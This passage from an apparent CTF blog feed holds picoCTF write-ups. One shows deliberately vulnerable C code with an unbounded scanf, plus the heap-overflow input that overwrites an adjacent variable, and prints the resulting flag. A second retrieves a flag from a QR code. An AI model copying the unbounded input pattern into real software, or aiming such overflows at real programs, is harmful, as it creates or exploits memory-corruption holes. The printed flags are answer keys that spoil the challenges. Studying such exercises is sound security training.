</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 56</span><span>    safe_var <span style="color:#89dceb;font-weight:bold">=</span> <span style="color:#89b4fa">malloc</span>(SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 57</span><span>    <span style="color:#89b4fa">strncpy</span>(safe_var, <span style="color:#a6e3a1">&#34;bico&#34;</span>, SAFE_VAR_SIZE);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 58</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 59</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 60</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">write_buffer</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 61</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Data for buffer: &#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 62</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 63</span><span>    <span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%s&#34;</span>, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 64</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 65</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 66</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">print_heap</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 67</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Heap State:</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 68</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 69</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*] Address   -&gt;   Heap Data   </span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 70</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 71</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, input_data, input_data);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 72</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 73</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;[*]   %p  -&gt;   %s</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>, safe_var, safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 74</span><span>    <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;+-------------+----------------+</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 75</span><span>    <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 76</span><span>}
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 77</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 78</span><span><span style="color:#f38ba8">int</span> <span style="color:#89b4fa">main</span>(<span style="color:#f38ba8">void</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 79</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 80</span><span>    <span style="color:#6c7086;font-style:italic">// Setup
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 81</span><span><span style="color:#6c7086;font-style:italic"></span>    <span style="color:#89b4fa">init</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 82</span><span>    <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 83</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 84</span><span>    <span style="color:#f38ba8">int</span> choice;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 85</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 86</span><span>    <span style="color:#cba6f7">while</span> (<span style="color:#fab387">1</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 87</span><span>        <span style="color:#89b4fa">print_menu</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 88</span><span>	<span style="color:#cba6f7">if</span> (<span style="color:#89b4fa">scanf</span>(<span style="color:#a6e3a1">&#34;%d&#34;</span>, <span style="color:#89dceb;font-weight:bold">&amp;</span>choice) <span style="color:#89dceb;font-weight:bold">!=</span> <span style="color:#fab387">1</span>) <span style="color:#89b4fa">exit</span>(<span style="color:#fab387">0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 89</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 90</span><span>        <span style="color:#cba6f7">switch</span> (choice) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 91</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">1</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 92</span><span>            <span style="color:#6c7086;font-style:italic">// print heap
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 93</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">print_heap</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 94</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 95</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">2</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 96</span><span>            <span style="color:#89b4fa">write_buffer</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 97</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 98</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">3</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 99</span><span>            <span style="color:#6c7086;font-style:italic">// print safe_var
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">100</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">Take a look at my variable: safe_var = %s</span><span style="color:#89b4fa">\n\n</span><span style="color:#a6e3a1">&#34;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">101</span><span>                   safe_var);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">102</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">103</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">104</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">4</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">105</span><span>            <span style="color:#6c7086;font-style:italic">// Check for win condition
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">106</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#89b4fa">check_win</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">107</span><span>            <span style="color:#cba6f7">break</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">108</span><span>        <span style="color:#cba6f7">case</span> <span style="color:#fab387">5</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">109</span><span>            <span style="color:#6c7086;font-style:italic">// exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">110</span><span><span style="color:#6c7086;font-style:italic"></span>            <span style="color:#cba6f7">return</span> <span style="color:#fab387">0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">111</span><span>        <span style="color:#cba6f7">default</span><span style="color:#89dceb;font-weight:bold">:</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">112</span><span>            <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;Invalid choice</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">113</span><span>            <span style="color:#89b4fa">fflush</span>(stdout);
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">114</span><span>        }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">115</span><span>    }
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">116</span><span>}</span></span></code></pre></div>
<br>
<p>Check out <code>check_win</code> function for the win condition:</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#f38ba8">void</span> <span style="color:#89b4fa">check_win</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>    <span style="color:#cba6f7">if</span> (<span style="color:#89dceb;font-weight:bold">!</span><span style="color:#89b4fa">strcmp</span>(safe_var, <span style="color:#a6e3a1">&#34;pico&#34;</span>)) {
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>        <span style="color:#89b4fa">printf</span>(<span style="color:#a6e3a1">&#34;</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">YOU WIN</span><span style="color:#89b4fa">\n</span><span style="color:#a6e3a1">&#34;</span>);</span></span></code></pre></div>
<p>Heap 1 task is every similar to Heap 0. The only difference is that we need to make the value of <code>safe_var</code> variable to &ldquo;<strong>pico</strong>&rdquo;. The address values of the variables are the same with Heap 0. Therefore, we already know they are 32bits apart. All we need to do is input 32-bit long characters to fill <code>input_data</code> variable and type &ldquo;<strong>pico</strong>&rdquo; after to overwrite the value of <code>safe_var</code> variable.</p>
<br>
<br>
<br>
Here's the solution:






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to heap1!
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>I put my data on the heap so it should be safe from any tampering.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Since my data isn<span style="color:#a6e3a1">&#39;t on the stack I&#39;</span>ll even <span style="color:#89dceb">let</span> you write whatever info you want to the heap, I already took care of using malloc <span style="color:#cba6f7">for</span> you.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Heap State:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Address   -&gt;   Heap Data
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span>   0x63e0c8e3d2b0  -&gt;   pico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span>   0x63e0c8e3d2d0  -&gt;   bico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>+-------------+----------------+
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>1. Print Heap:          <span style="color:#89dceb;font-weight:bold">(</span>print the current state of the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>2. Write to buffer:     <span style="color:#89dceb;font-weight:bold">(</span>write to your own personal block of data on the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>3. Print safe_var:      <span style="color:#89dceb;font-weight:bold">(</span>I<span style="color:#a6e3a1">&#39;ll even let you look at my variable on the heap, I&#39;</span>m confident it can<span style="color:#a6e3a1">&#39;t be modified)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#a6e3a1">4. Print Flag:          (Try to print the flag, good luck)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#a6e3a1">5. Exit
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#a6e3a1">Enter your choice: 2
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#a6e3a1">Data for buffer: abcdefghijklmnopqrstuvwxyz123456pico
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#a6e3a1">1. Print Heap:          (print the current state of the heap)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#a6e3a1">2. Write to buffer:     (write to your own personal block of data on the heap)
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span><span style="color:#a6e3a1">3. Print safe_var:      (I&#39;</span>ll even <span style="color:#89dceb">let</span> you look at my variable on the heap, I<span style="color:#a6e3a1">&#39;m confident it can&#39;</span>t be modified<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>4. Print Flag:          <span style="color:#89dceb;font-weight:bold">(</span>Try to print the flag, good luck<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>5. Exit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Enter your choice: <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>Take a look at my variable: <span style="color:#f5e0dc">safe_var</span> <span style="color:#89dceb;font-weight:bold">=</span> pico
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>1. Print Heap:          <span style="color:#89dceb;font-weight:bold">(</span>print the current state of the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>2. Write to buffer:     <span style="color:#89dceb;font-weight:bold">(</span>write to your own personal block of data on the heap<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>3. Print safe_var:      <span style="color:#89dceb;font-weight:bold">(</span>I<span style="color:#a6e3a1">&#39;ll even let you look at my variable on the heap, I&#39;</span>m confident it can<span style="color:#f38ba8">&#39;</span>t be modified<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>4. Print Flag:          <span style="color:#89dceb;font-weight:bold">(</span>Try to print the flag, good luck<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">39</span><span>5. Exit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">40</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">41</span><span>Enter your choice: <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">42</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">43</span><span>YOU WIN
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">44</span><span>picoCTF<span style="color:#89dceb;font-weight:bold">{</span>starting_to_get_the_hang_ce5bee9b<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<p><strong><em>flag</em></strong>: picoCTF{starting_to_get_the_hang_ce5bee9b}</p>
<hr>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Scan Surprise</title>
      <link>http://localhost:1313/picoctf-scan-surprise/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-scan-surprise/</guid>
      <description>Description I&amp;rsquo;ve gotton bored of handing out flags as text. Wouldn&amp;rsquo;t it be cool if they were an image instead?
This is what wee see when we first log into the ssh server, a QR code. The one thing we could easily do to capture the flag is to scan the QR code with our mobile phones since they have included native QR code scanner in their cameras since version 8 and iOS 11.</description>
      <content:encoded><![CDATA[<h3 id="description">Description</h3>
<br>
<p>I&rsquo;ve gotton bored of handing out flags as text.
Wouldn&rsquo;t it be cool if they were an image instead?</p>
<hr>
<p>This is what wee see when we first log into the ssh server, a QR code.
<img src="image.png#center" alt="alt text"></p>
<p>The one thing we could easily do to capture the flag is to scan the QR code with our mobile phones since they have included native QR code scanner in their cameras since <em>version 8</em> and <em>iOS 11</em>.</p>
<div style="text-align: center"><img src="./IMG_8604.PNG" style="width: 300px; "></div>
<p>This is a screenshot of my camera app scanning the QR code, as you can see the camera app automatically recognizes the QR code and it&rsquo;s directing us to a destination.</p>
<div style="text-align: center"><img src="./IMG_8605.PNG" style="width: 300px; "></div>
<p>Looks like we got the flag.</p>
<p><strong><em>flag</em></strong>: <code>picoCTF{p33k_@_b00_0194a007}</code></p>
<hr>
<p>One of the hints tells us that if you don&rsquo;t have access to a phone, you can also use <code>zbar-tools</code> to convert an image to text.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[picoCTF] Verify</title>
      <link>http://localhost:1313/picoctf-verify/</link>
      <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/picoctf-verify/</guid>
      <description>Happy 4th of July
